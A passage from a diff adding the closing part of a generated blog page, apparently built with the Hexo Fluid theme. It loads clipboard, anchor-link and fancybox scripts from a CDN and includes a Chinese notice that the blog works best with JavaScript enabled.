+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
